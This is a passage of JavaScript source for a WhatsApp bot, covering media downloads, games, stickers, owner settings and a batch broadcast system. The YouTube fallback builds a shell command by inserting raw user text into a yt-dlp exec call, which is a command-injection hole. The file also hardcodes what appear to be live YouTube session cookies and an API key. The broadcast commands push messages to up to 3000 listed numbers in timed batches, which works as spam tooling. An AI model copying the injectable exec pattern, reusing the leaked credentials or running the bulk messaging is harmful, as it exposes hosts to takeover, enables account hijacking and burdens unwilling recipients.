                if (!text) return reply('Provide an expression. e.g., .calc 5+3*2');
                try {
                    const result = mathjs.evaluate(text);
                    return reply(`📊 ${result}`);
                } catch { return reply('Invalid expression.'); }

            case 'translate':
                if (!text) return reply('Usage: .translate es Hello world');
                const [langCode, ...words] = text.split(' ');
                const toTranslate = words.join(' ');
                if (!langCode || !toTranslate) return reply('Usage: .translate es Hello world');
                try {
                    const { text: translated } = await translate(toTranslate, { to: langCode });
                    return reply(`🌐 (${langCode}) ${translated}`);
                } catch { return reply('Translation failed.'); }

            case 'qr':
                if (!text) return reply('Provide text/url.');
                try {
                    const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}`;
                    return sock.sendMessage(jid, { image: { url: qrApi }, caption: text }, { quoted: msg });
                } catch { return reply('QR generation failed.'); }

            case 'url':
                if (!text) return reply('Give a link.');
                try {
                    const tiny = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`);
                    if (tiny.data && tiny.data.startsWith('http')) return reply(`🔗 ${tiny.data}`);
                } catch {}
                try {
                    const isgd = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(text)}`);
                    if (isgd.data && isgd.data.startsWith('http')) return reply(`🔗 ${isgd.data}`);
                } catch {}
                return reply('URL shortening failed.');

            case 'poll': {
                if (!isGroup) return reply('Group only.');
                if (!text.includes('|')) return reply('Usage: .poll Question | Option1 | Option2 ...');
                const [question, ...options] = text.split('|').map(s => s.trim());
                if (!question || options.length < 2) return reply('Need at least 2 options.');
                let pollText = `📊 *${question}*\n`;
                options.forEach((opt, i) => pollText += `${i+1}. ${opt}\n`);
                const pollMsg = await sock.sendMessage(jid, { text: pollText }, { quoted: msg });
                const emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣','🔟'];
                for (let i = 0; i < options.length && i < emojis.length; i++) {
                    await sock.sendMessage(jid, { react: { text: emojis[i], key: pollMsg.key } });
                }
                return;
            }
                
                // =========== MEDIA DOWNLOAD ===========
case 'play': {
    if (!text) return reply('Usage: .play [song name]');
    
    reply('🔍 Searching for audio...');
    
    // Try Spotify API first
    try {
        const spotRes = await axios.post('https://apis.malvryx.dev/api/music/spotify-search', {
            query: text,
            limit: 1
        }, {
            headers: {
                'X-API-Key': 'mlvx_free_fd71c00a703c311d5241c097a8d0b3a9f36e34cef3f411beee5dbb450892e52f', // REPLACE WITH YOUR ACTUAL KEY
                'Content-Type': 'application/json'
            },
            timeout: 10000
        });
        
        if (spotRes.data?.status === 'success' && spotRes.data?.result?.tracks?.[0]) {
            const track = spotRes.data.result.tracks[0];
            const previewUrl = track.urlpreview;
            
            if (previewUrl) {
                reply(`🎵 *${track.title}* — ${track.artist}\n📥 Downloading Spotify preview...`);
                
                const previewRes = await axios.get(previewUrl, { 
                    responseType: 'arraybuffer',
                    timeout: 15000 
                });
                
                await sock.sendMessage(jid, {
                    audio: Buffer.from(previewRes.data),
                    mimetype: 'audio/mpeg',
                    ptt: false
                }, { quoted: msg });
                
                return reply('✅ Done! (Spotify preview)');
            }
        }
    } catch {}
    
    // Fallback: try YouTube via ytdl-core
    try {
        const ytSearch = require('yt-search');
        const ytdl = require('@distube/ytdl-core');
        
        const search = await ytSearch(text);
        const video = search.videos[0];
        if (!video) return reply('❌ No results found.');
        
        reply(`🎵 *${video.title}*\n⏱ ${video.timestamp}\n📥 Downloading...`);
        
        const stream = ytdl(video.url, {
            filter: 'audioonly',
            quality: 'lowestaudio',
            requestOptions: {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
                }
            }
        });
        
        const chunks = [];
        stream.on('data', chunk => chunks.push(chunk));
        stream.on('end', async () => {
            await sock.sendMessage(jid, {
                audio: Buffer.concat(chunks),
                mimetype: 'audio/mpeg',
                ptt: false
            }, { quoted: msg });
            reply('✅ Done!');
        });
        stream.on('error', (err) => reply('❌ Download failed: ' + err.message));
        
    } catch (err) {
        // Final fallback: try yt-dlp
        try {
            const { exec } = require('child_process');
            const outFile = path.join(SESSION_DIR, 'tmp', `play_${Date.now()}.mp3`);
            const tmpDir = path.join(SESSION_DIR, 'tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
            
            reply('⬇️ Trying alternative download method...');
            
            await new Promise((resolve, reject) => {
                exec(`yt-dlp -x --audio-format mp3 --no-check-certificate --default-search "ytsearch" -o "${outFile}" "${text}"`,
                    { timeout: 60000, maxBuffer: 50 * 1024 * 1024 },
                    (error) => {
                        if (error && !fs.existsSync(outFile)) reject(error);
                        else resolve();
                    }
                );
            });
            
            if (fs.existsSync(outFile)) {
                await sock.sendMessage(jid, {
                    audio: fs.readFileSync(outFile),
                    mimetype: 'audio/mpeg',
                    ptt: false
                }, { quoted: msg });
                reply('✅ Done!');
                try { fs.unlinkSync(outFile); } catch {}
            } else {
                reply('❌ All download methods failed.');
            }
        } catch (dlErr) {
            reply('❌ Play Error: ' + (err.message || 'unknown error'));
        }
    }
    break;
}
                
                case 'ytmp3': {
    if (!text) return reply(`Usage: .${command} [YouTube Link]`);
    const ytdl = require('@distube/ytdl-core');

    reply('📥 Downloading YouTube Audio...');

    try {
        const stream = ytdl(text, {
            filter: 'audioonly',
            requestOptions: {
                headers: {
                    // PASTE YOUR EXTRACTED COOKIE STRING HERE
                    'Cookie': '"APISID=2nFqeGczjux2HaSj/ADgSbKrVpBOTdX-AW; SAPISID=t5az2p_KOrwyv9hH/AT6bfa9c1LbCIzekk; __Secure-1PAPISID=t5az2p_KOrwyv9hH/AT6bfa9c1LbCIzekk; __Secure-3PAPISID=t5az2p_KOrwyv9hH/AT6bfa9c1LbCIzekk; SID=g.a0009QhcvNCCQKeheb5Jr47DegCtVdSmkz2l7FJe3twWQfB8u45Y0QDx3zxRuWBuHvMc9v4iTQACgYKAWoSARMSFQHGX2Mih1bC_JrEuCr-uSNjF9iVFhoVAUF8yKowY3y17DsO2RxK1-Bzj3YI0076; PREF=f4=4000000&f6=40000000&tz=Africa.Lagos; SIDCC=AKEyXzUCa6DVCcZGn56ctB3FaRmoFnvQkxpmquElXqhAnqGjK9f3-XHYhfTwF8XZZGAJbRYh"',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
                }
            }
        });

        const chunks = [];
        stream.on('data', chunk => chunks.push(chunk));
        stream.on('end', async () => {
            await sock.sendMessage(jid, {
                audio: Buffer.concat(chunks),
                mimetype: 'audio/mpeg'
            }, { quoted: msg });
            reply('✅ Done!');
        });

    } catch (err) {
        reply('❌ YouTube Error: ' + err.message);
    }
    break;
}

            
            case 'tiktok': {
    if (!text) return reply('Usage: .tiktok [tiktok url]');
    
    // Basic URL validation
    if (!text.includes('tiktok.com') && !text.includes('vm.tiktok')) {
        return reply('❌ Please provide a valid TikTok URL');
    }
    
    reply('⬇️ Downloading TikTok video...');
    
    try {
        // Try using tiklydown API first
        const tikTokApi = `https://www.tiklydown.me/api?url=${encodeURIComponent(text)}`;
        const response = await axios.get(tikTokApi, { timeout: 15000 });
        
        if (response.data && response.data.videoUrl) {
            const videoUrl = response.data.videoUrl;
            const videoTitle = response.data.title || 'TikTok Video';
            
            // Send the video directly from URL
            await sock.sendMessage(jid, {
                video: { url: videoUrl },
                caption: `🎵 ${videoTitle}`,
                mimetype: 'video/mp4'
            }, { quoted: msg });
            
            return;
        }
    } catch {}
    
    // Fallback: try another API
    try {
        const api2 = `https://tikwm.com/api/?url=${encodeURIComponent(text)}`;
        const response2 = await axios.get(api2, { 
            headers: { 'User-Agent': 'Mozilla/5.0' },
            timeout: 15000 
        });
        
        if (response2.data && response2.data.data) {
            const videoUrl = response2.data.data.play || response2.data.data.wmplay;
            const videoTitle = response2.data.data.title || 'TikTok Video';
            
            if (videoUrl) {
                await sock.sendMessage(jid, {
                    video: { url: videoUrl },
                    caption: `🎵 ${videoTitle}`,
                    mimetype: 'video/mp4'
                }, { quoted: msg });
                
                // Try to send audio separately if available
                const audioUrl = response2.data.data.music;
                if (audioUrl) {
                    await sock.sendMessage(jid, {
                        audio: { url: audioUrl },
                        mimetype: 'audio/mpeg'
                    });
                }
                
                return;
            }
        }
    } catch {}
    
    // Final fallback: try snaptik
    try {
        const api3 = `https://snaptik.app/api?url=${encodeURIComponent(text)}`;
        const response3 = await axios.get(api3, {
            headers: { 
                'User-Agent': 'Mozilla/5.0',
                'Referer': 'https://snaptik.app/'
            },
            timeout: 15000
        });
        
        if (response3.data && response3.data.url) {
            await sock.sendMessage(jid, {
                video: { url: response3.data.url },
                caption: '🎵 TikTok Video',
                mimetype: 'video/mp4'
            }, { quoted: msg });
            
            return;
        }
    } catch {}
    
    reply('❌ Failed to download TikTok video. The API may have changed. Try updating the code.');
    break;
}
                

            // =========== INFO ===========
            case 'owner':
                return replyWithImage('./elite.jpg', `👑 Owner: ${config.ownerName}`);

            case 'id':
                return reply(`User: ${sender}\nChat: ${jid}`);

            case 'rules':
                return reply('⚠️ Respect group rules.');

            case 'profile': {
                let targetJid = mentionedJid || sender;
                try {
                    let ppUrl = await sock.profilePictureUrl(targetJid, 'image').catch(() => null);
                    let status = 'No status';
                    try { status = (await sock.fetchStatus(targetJid)).status; } catch {}
                    const caption = `👤 ${cleanNumber(targetJid)}\n📝 ${status}`;
                    if (ppUrl) {
                        return sock.sendMessage(jid, { image: { url: ppUrl }, caption, mentions: [targetJid] }, { quoted: msg });
                    } else {
                        return reply(caption);
                    }
                } catch { return reply('Could not fetch profile.'); }
            }

            case 'me':
                const myInfo = {
                    name: sock.user.name,
                    sessionId: waInstance.sessionId,
                    ownerNumber: waInstance.ownerNumber || 'not set',
                    ownerLid: waInstance.ownerLid || 'not set'
                };
                return reply(`👤 Name: ${myInfo.name}\n📱 Session: ${myInfo.sessionId}\n👑 Owner: ${myInfo.ownerNumber}`);

            case 'groups':
                if (!isSupremeOwner) return reply('Owner only.');
                try {
                    const allGroups = await sock.groupFetchAllParticipating();
                    const groupList = Object.values(allGroups).map(g => `${g.subject} (${g.id})`).join('\n');
                    return reply(`📋 Groups:\n${groupList}`);
                } catch { return reply('Failed to fetch groups.'); }

            // =========== BATCH BROADCAST SYSTEM ===========
case 'addtargets':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    if (!text) return reply('Usage: .addtargets 2348012340001,2348012340002,2348012340003');
    
    const targetFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_targets.txt');
    
    const newNumbers = text
        .split(/[,;\n\s]+/)
        .map(n => n.replace(/[^0-9]/g, ''))
        .filter(n => n.length >= 7);
    
    if (newNumbers.length === 0) return reply('❌ No valid numbers found.');
    
    let existingNumbers = [];
    if (fs.existsSync(targetFile)) {
        try {
            const existingContent = fs.readFileSync(targetFile, 'utf8');
            existingNumbers = existingContent
                .split(/[\r\n]+/)
                .map(n => n.replace(/[^0-9]/g, ''))
                .filter(n => n.length >= 7);
        } catch {}
    }
    
    const allNumbers = [...new Set([...existingNumbers, ...newNumbers])];
    
    if (allNumbers.length > 3000) {
        return reply(`❌ Cannot exceed 3000 targets. Currently have ${existingNumbers.length}, trying to add ${newNumbers.length}.`);
    }
    
    fs.writeFileSync(targetFile, allNumbers.join('\n'));
    
    return reply(`✅ Added ${newNumbers.length} targets.\n📋 Total in list: ${allNumbers.length}/3000`);
    break;

case 'listtargets':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    
    const ltFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_targets.txt');
    if (!fs.existsSync(ltFile)) return reply('📋 Target list is empty.');
    
    const ltContent = fs.readFileSync(ltFile, 'utf8');
    const ltNumbers = ltContent.split(/[\r\n]+/).filter(n => n.length >= 7);
    
    if (ltNumbers.length === 0) return reply('📋 Target list is empty.');
    
    const preview = ltNumbers.slice(0, 20).join('\n');
    const remaining = ltNumbers.length > 20 ? `\n... and ${ltNumbers.length - 20} more` : '';
    
    return reply(`📋 *Target List*\nTotal: ${ltNumbers.length}/3000\n\n${preview}${remaining}`);
    break;

case 'cleartargets':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    
    const ctFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_targets.txt');
    if (fs.existsSync(ctFile)) {
        fs.writeFileSync(ctFile, '');
    }
    if (waInstance._broadcastState) {
        delete waInstance._broadcastState;
    }
    return reply('🗑 Target list and broadcast state cleared.');
    break;

case 'broadcastpm':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    if (!text) return reply('Usage: .broadcastpm Your broadcast message');
    
    const bpmFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_targets.txt');
    
    if (!fs.existsSync(bpmFile)) {
        return reply('❌ No target list found. Use .addtargets to add numbers first.');
    }
    
    const bpmContent = fs.readFileSync(bpmFile, 'utf8');
    const bpmNumbers = bpmContent.split(/[\r\n]+/).filter(n => n.length >= 7);
    
    if (bpmNumbers.length === 0) return reply('❌ Target list is empty. Use .addtargets to add numbers.');
    
    if (waInstance._broadcastState && waInstance._broadcastState.active) {
        const state = waInstance._broadcastState;
        const elapsed = Math.floor((Date.now() - state.startedAt) / 1000);
        const mins = Math.floor(elapsed / 60);
        const secs = elapsed % 60;
        return reply(
`⏳ *Broadcast already running!*
Progress: ${state.sent + state.failed}/${state.total}
Sent: ${state.sent}
Failed: ${state.failed}
Started: ${mins}m ${secs}s ago
Next batch in: ${state.waiting ? Math.ceil((state.nextBatchAt - Date.now()) / 1000) + 's' : 'processing...'}

Wait for it to finish or use .cancelbroadcast to stop.`
        );
    }
    
    const BATCH_SIZE = 50;
    const WAIT_BETWEEN_BATCHES = 5 * 60 * 1000;
    const totalTargets = bpmNumbers.length;
    
    waInstance._broadcastState = {
        active: true,
        numbers: bpmNumbers,
        total: totalTargets,
        sent: 0,
        failed: 0,
        notOnWA: 0,
        currentIndex: 0,
        startedAt: Date.now(),
        waiting: false,
        nextBatchAt: 0,
        message: text,
        failureDetails: {}
    };
    
    reply(`📤 *Broadcast Started*
━━━━━━━━━━━━━━━━━━
Total targets: ${totalTargets}
Batch size: ${BATCH_SIZE}
Wait between: 5 minutes
Estimated time: ~${Math.ceil(totalTargets / BATCH_SIZE) * 5} minutes
━━━━━━━━━━━━━━━━━━
Broadcasting in batches of 50...`);
    
    processNextBatch(waInstance, sock, jid, BATCH_SIZE, WAIT_BETWEEN_BATCHES, config);
    return;
    break;

case 'cancelbroadcast':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can cancel broadcasts.');
    if (!waInstance._broadcastState || !waInstance._broadcastState.active) {
        return reply('❌ No active broadcast to cancel.');
    }
    waInstance._broadcastState.active = false;
    waInstance._broadcastState = null;
    return reply('🛑 Broadcast cancelled.');
    break;

case 'failed':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    
    const failFile = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_failures.json');
    const state2 = waInstance._broadcastState;
    
    if (state2 && state2.failureDetails && Object.keys(state2.failureDetails).length > 0) {
        return showFailedReport(sock, jid, state2.failureDetails, state2, 'active');
    }
    
    if (fs.existsSync(failFile)) {
        try {
            const report = JSON.parse(fs.readFileSync(failFile, 'utf8'));
            if (report.failures && Object.keys(report.failures).length > 0) {
                return showFailedReport(sock, jid, report.failures, report, 'saved');
            }
        } catch {}
    }
    
    return reply('✅ No failed deliveries to report.');
    break;

case 'resendfailed':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can use this.');
    
    const failFile2 = path.join(SESSION_DIR, waInstance.sessionId, 'broadcast_failures.json');
    const state3 = waInstance._broadcastState;
    
    let failedNumbers = [];
    let broadcastMessage = '';
    
    if (state3 && state3.failureDetails && Object.keys(state3.failureDetails).length > 0) {
        failedNumbers = Object.keys(state3.failureDetails);
        broadcastMessage = state3.message;
    } 
    else if (fs.existsSync(failFile2)) {
        try {
            const report = JSON.parse(fs.readFileSync(failFile2, 'utf8'));
            if (report.failures && Object.keys(report.failures).length > 0) {
                failedNumbers = Object.keys(report.failures);
                broadcastMessage = report.message || '';
            }
        } catch {}
    }
    
    if (failedNumbers.length === 0) return reply('✅ No failed numbers to resend.');
    if (!broadcastMessage && !text) {
        return reply('❌ No message saved from previous broadcast. Provide a message:\n.resendfailed Your message');
    }
    
    const messageToSend = broadcastMessage || text;
    
    reply(`🔄 Resending to ${failedNumbers.length} failed numbers...`);
    
    let resent = 0;
    let stillFailed = 0;
    let newFailures = {};
    
    for (const num of failedNumbers) {
        const targetJid = num + '@s.whatsapp.net';
        let failReason = null;
        
        try {
            const exists = await checkNumberExists(sock, num);
            if (!exists) {
                stillFailed++;
                failReason = 'still_not_on_whatsapp';
            } else {
                await sock.sendMessage(targetJid, {
                    text: `📢 *BROADCAST MESSAGE (Resend)*\n\n${messageToSend}\n\n— ${config.botName}`
                });
                resent++;
                continue;
            }
        } catch (err) {
            stillFailed++;
            failReason = err.message?.includes('blocked') ? 'blocked_me' :
                         err.message?.includes('rate') ? 'rate_limited' : 'unknown_error';
        }
        
        if (failReason) {
            newFailures[num] = {
                reason: failReason,
                timestamp: Date.now(),
                batch: 0,
                isResend: true
            };
        }
        
        await wait(200);
    }
    
    if (Object.keys(newFailures).length > 0) {
        const updatedReport = {
            broadcastStarted: state3?.startedAt ? new Date(state3.startedAt).toLocaleString() : 'unknown',
            broadcastEnded: new Date().toLocaleString(),
            total: failedNumbers.length,
            sent: resent,
            totalFailed: stillFailed,
            notOnWA: Object.values(newFailures).filter(f => f.reason === 'still_not_on_whatsapp').length,
            message: messageToSend,
            failures: newFailures
        };
        try { fs.writeFileSync(failFile2, JSON.stringify(updatedReport, null, 2)); } catch {}
    } else {
        try { fs.writeFileSync(failFile2, JSON.stringify({ failures: {} }, null, 2)); } catch {}
    }
    
    return reply(
`✅ *Resend Complete*
━━━━━━━━━━━━━━
🔄 Attempted resend: ${failedNumbers.length}
✅ Successfully resent: ${resent}
❌ Still failed: ${stillFailed}
━━━━━━━━━━━━━━
Use .failed to see remaining failures.

Breakdown of still failed:
📵 Not on WA: ${Object.values(newFailures).filter(f => f.reason === 'still_not_on_whatsapp').length}
🚫 Blocked you: ${Object.values(newFailures).filter(f => f.reason === 'blocked_me').length}
❓ Other: ${Object.values(newFailures).filter(f => !['still_not_on_whatsapp', 'blocked_me'].includes(f.reason)).length}`
    );
    break;

            case 'block':
                if (!isSupremeOwner) return reply('Owner only.');
                if (!mentionedJid) return reply('Mention someone to block.');
                await sock.updateBlockStatus(mentionedJid, 'block');
                return reply('🚫 Blocked.');

            case 'unblock':
                if (!isSupremeOwner) return reply('Owner only.');
                if (!mentionedJid) return reply('Mention someone to unblock.');
                await sock.updateBlockStatus(mentionedJid, 'unblock');
                return reply('✅ Unblocked.');

            // =========== FUN ===========
            case 'dice': return reply(`🎲 ${Math.floor(Math.random() * 6) + 1}`);

            case 'roll':
                if (!text) return reply('Format: .roll 2d10');
                const [count, sides] = text.split('d').map(Number);
                if (!count || !sides) return reply('Invalid. Example: .roll 2d20');
                let result = [];
                for (let i = 0; i < count; i++) result.push(Math.floor(Math.random() * sides) + 1);
                return reply(`🎲 ${result.join(', ')} (sum: ${result.reduce((a,b)=>a+b,0)})`);

            case 'rps':
                if (!text || !['rock','paper','scissors'].includes(text.toLowerCase())) return reply('Choose rock, paper, or scissors.');
                const botChoice = ['rock','paper','scissors'][Math.floor(Math.random()*3)];
                const userChoice = text.toLowerCase();
                let outcome;
                if (userChoice === botChoice) outcome = 'Draw!';
                else if (
                    (userChoice === 'rock' && botChoice === 'scissors') ||
                    (userChoice === 'paper' && botChoice === 'rock') ||
                    (userChoice === 'scissors' && botChoice === 'paper')
                ) outcome = 'You win!';
                else outcome = 'Bot wins!';
                return reply(`You: ${userChoice}\nBot: ${botChoice}\n${outcome}`);

            case '8ball':
                const answers = ['Yes', 'No', 'Maybe', 'Ask later', 'Definitely', 'Doubtful'];
                return reply(`🎱 ${answers[Math.floor(Math.random()*answers.length)]}`);

            case 'fact':
                try {
                    const factRes = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en');
                    return reply(`💡 ${factRes.data.text}`);
                } catch { return reply('Could not fetch fact.'); }

            case 'meme':
                try {
                    const memeRes = await axios.get('https://meme-api.com/gimme');
                    return sock.sendMessage(jid, { image: { url: memeRes.data.url }, caption: memeRes.data.title }, { quoted: msg });
                } catch { return reply('No meme found.'); }

            case 'quote':
                try {
                    const quoteRes = await axios.get('https://api.quotable.io/random');
                    return reply(`💬 "${quoteRes.data.content}" — ${quoteRes.data.author}`);
                } catch {
                    try {
                        const zenRes = await axios.get('https://zenquotes.io/api/random');
                        const zen = zenRes.data[0];
                        return reply(`💬 "${zen.q}" — ${zen.a}`);
                    } catch { return reply('No quote available.'); }
                }

            case 'joke':
                try {
                    const jokeRes = await axios.get('https://v2.jokeapi.dev/joke/Any?type=single');
                    return reply(`😂 ${jokeRes.data.joke}`);
                } catch { return reply('Could not fetch joke.'); }

            case 'hack':
                const hackTarget = mentionedJid ? cleanNumber(mentionedJid) : senderClean;
                reply(`👨‍💻 Hacking ${hackTarget}...`);
                setTimeout(() => reply(`[${hackTarget}] Facebook password: *******`), 2000);
                setTimeout(() => reply(`[${hackTarget}] Instagram DMs downloading...`), 4000);
                setTimeout(() => reply(`✅ Hack complete. Just kidding 😂`), 6000);
                return;

            case 'tictactoe':
                if (!isGroup) return reply('Group only.');
                if (tictactoeGames[jid]) return reply('A game is already running.');
                tictactoeGames[jid] = {
                    board: ['1','2','3','4','5','6','7','8','9'],
                    players: { X: senderClean, O: null },
                    turn: 'X'
                };
                return reply(`🎮 Tic-Tac-Toe started!\nPlayer X: ${senderClean}\nAnother player join with .jointtt`);

            case 'jointtt':
                if (!isGroup) return reply('Group only.');
                const ttt = tictactoeGames[jid];
                if (!ttt) return reply('No game. Use .tictactoe');
                if (ttt.players.O) return reply('Already have two players.');
                ttt.players.O = senderClean;
                return reply(`Player O joined!\nBoard:\n${formatBoard(ttt.board)}`);

            case 'move':
                if (!isGroup) return reply('Group only.');
                const game = tictactoeGames[jid];
                if (!game) return reply('No game. Use .tictactoe');
                const player = senderClean;
                if (game.players[game.turn] !== player) return reply('Not your turn.');
                const pos = parseInt(text) - 1;
                if (isNaN(pos) || pos < 0 || pos > 8 || ['X','O'].includes(game.board[pos])) return reply('Invalid move.');
                game.board[pos] = game.turn;
                const winCombos = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
                let winner = null;
                for (const combo of winCombos) {
                    const [a,b,c] = combo;
                    if (game.board[a] === game.turn && game.board[b] === game.turn && game.board[c] === game.turn) winner = game.turn;
                }
                if (winner) {
                    delete tictactoeGames[jid];
                    return reply(`${winner} wins!🎉`);
                } else if (game.board.every(cell => ['X','O'].includes(cell))) {
                    delete tictactoeGames[jid];
                    return reply("It's a draw!");
                }
                game.turn = game.turn === 'X' ? 'O' : 'X';
                return reply(`Board:\n${formatBoard(game.board)}\n${game.turn}'s turn.`);

            case 'trivia':
                if (!isGroup) return reply('Group only.');
                if (triviaSessions[jid]) return reply('Trivia already running.');
                try {
                    const triviaData = await axios.get('https://opentdb.com/api.php?amount=1');
                    const q = triviaData.data.results[0];
                    const question = q.question.replace(/&quot;/g,'"').replace(/&#039;/g,"'");
                    const correctAnswer = q.correct_answer;
                    const allAnswers = [...q.incorrect_answers, correctAnswer].sort(() => Math.random() - 0.5);
                    triviaSessions[jid] = {
                        question,
                        correctAnswer,
                        timer: setTimeout(() => {
                            reply(`⏰ Time up! The answer was: ${correctAnswer}`);
                            delete triviaSessions[jid];
                        }, 15000)
                    };
                    return reply(`🤔 Trivia (15s): ${question}\nOptions: ${allAnswers.join(', ')}`);
                } catch { return reply('Could not fetch trivia.'); }

            case 'answer':
                if (!isGroup) return reply('Group only.');
                const session = triviaSessions[jid];
                if (!session) return reply('No trivia running.');
                if (text.toLowerCase() === session.correctAnswer.toLowerCase()) {
                    clearTimeout(session.timer);
                    delete triviaSessions[jid];
                    return reply(`✅ Correct, ${senderClean}!`);
                } else {
                    return reply('❌ Wrong answer.');
                }

            case 'react':
                if (quotedMessage) {
                    const quotedMsgKey = {
                        remoteJid: jid,
                        fromMe: contextInfo.participant ? false : true,
                        id: contextInfo.stanzaId,
                        participant: contextInfo.participant
                    };
                    try {
                        await sock.sendMessage(jid, { react: { text: text || '❤️', key: quotedMsgKey } });
                    } catch { return reply('Reaction failed.'); }
                } else {
                    return reply('Reply to a message to react.');
                }
                break;

            // =========== AFK ===========
            case 'afk':
                if (text.toLowerCase() === 'off') {
                    delete afkUsers[senderClean];
                    return reply('✅ You are no longer AFK.');
                } else {
                    const afkMsg = text || 'Away from keyboard.';
                    afkUsers[senderClean] = { message: afkMsg, timestamp: Date.now() };
                    return reply(`💤 You are now AFK: ${afkMsg}`);
                }

            // =========== MEDIA ===========
case 'sticker': {
    try {
        let sourceMsg = msg;
        if (quotedMessage) {
            sourceMsg = {
                key: {
                    remoteJid: jid,
                    fromMe: false,
                    id: contextInfo.stanzaId,
                    participant: contextInfo.participant || jid
                },
                message: quotedMessage
            };
        }

        const hasImage = sourceMsg.message?.imageMessage;
        const hasVideo = sourceMsg.message?.videoMessage;
        if (!hasImage && !hasVideo) return reply('Send an image/video or reply to one with .sticker');

        const isVideo = !!hasVideo && !hasImage;

        reply('Creating sticker...');

        const buffer = await downloadMediaMessage(
            sourceMsg,
            'buffer',
            {},
            {
                reuploadRequest: sock.updateMediaMessage,
                logger: pino({ level: 'silent' })
            }
        );

        if (!buffer) return reply('Failed to download media.');

        const sizeMB = buffer.length / (1024 * 1024);
        if (isVideo && sizeMB > 15) return reply('Video too large. Max 15MB.');

        let stickerBuffer;
        const tempDir = path.join(SESSION_DIR, 'tmp');
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        if (isVideo) {
            const tempInput = path.join(tempDir, `input_${Date.now()}.mp4`);
            const outputPath = path.join(tempDir, `output_${Date.now()}.webp`);
            fs.writeFileSync(tempInput, buffer);

            await new Promise((resolve, reject) => {
                ffmpeg(tempInput)
                    .outputOptions([
                        '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:-1:-1:color=0x00000000',
                        '-vcodec', 'libwebp', '-loop', '0', '-preset', 'default', '-an', '-vsync', '0', '-s', '512:512'
                    ])
                    .toFormat('webp')
                    .save(outputPath)
                    .on('end', () => {
                        try {
                            stickerBuffer = fs.readFileSync(outputPath);
                            if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
                            if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
                            resolve();
                        } catch(e) { reject(e); }
                    })
                    .on('error', (err) => {
                        try {
                            if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
                            if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
                        } catch {}
                        reject(err);
                    });
            });
        } else {
            stickerBuffer = await sharp(buffer)
                .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
                .webp({ quality: 80 })
                .toBuffer();
        }

        await sock.sendMessage(jid, { sticker: stickerBuffer }, { quoted: msg });
    } catch (err) {
        console.error('Sticker error:', err);
        reply('Failed to create sticker: ' + (err.message || 'unknown error'));
    }
    break;
}
               
        // ===== CHECK STICKER =====
        case 'toimg': {
    try {
        if (!quotedMessage?.stickerMessage) return reply('Reply to a sticker with .toimg');

        const isAnimated = quotedMessage.stickerMessage.isAnimated === true ||
                           quotedMessage.stickerMessage.mimetype?.includes('video');
        if (isAnimated) return reply('Cannot convert animated stickers.');

        if (!contextInfo?.stanzaId) return reply('Cannot process this sticker.');

        reply('Converting sticker...');

        const sourceMsg = {
            key: {
                remoteJid: jid,
                fromMe: false,
                id: contextInfo.stanzaId,
                participant: contextInfo.participant || jid
            },
            message: quotedMessage
        };

        const buffer = await downloadMediaMessage(
            sourceMsg,
            'buffer',
            {},
            {
                reuploadRequest: sock.updateMediaMessage,
                logger: pino({ level: 'silent' })
            }
        );

        if (!buffer) return reply('Failed to download sticker.');

        const pngBuffer = await sharp(buffer).png().toBuffer();
        await sock.sendMessage(jid, { image: pngBuffer, caption: 'Converted' }, { quoted: msg });
    } catch (err) {
        console.error('Toimg error:', err);
        reply('Failed to convert: ' + (err.message || 'unknown error'));
    }
    break;
}


            // =========== SESSION CUSTOMIZATION (owner only) ===========
            case 'setowner':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can change the owner name.');
                if (!text) return reply('Provide a name, e.g., .setowner John');
                config.ownerName = text.trim();
                waInstance.saveConfig();
                return reply(`✅ Owner name changed to "${text.trim()}"`);

            case 'setbotname':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can change the bot name.');
                if (!text) return reply('Provide a name, e.g., .setbotname MyBot');
                config.botName = text.trim();
                waInstance.saveConfig();
                return reply(`✅ Bot name changed to "${text.trim()}"`);

            case 'setprefix':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can change the prefix.');
                if (!text) return reply('Provide a single character, e.g., .setprefix !');
                if (text.length !== 1) return reply('Prefix must be a single character.');
                config.prefix = text;
                waInstance.prefix = text;
                waInstance.saveConfig();
                return reply(`✅ Prefix changed to "${text}"`);

            case 'reset':
                if (!isBotOwner && !isSupremeOwner) return reply('❌ Only the bot owner can reset settings.');
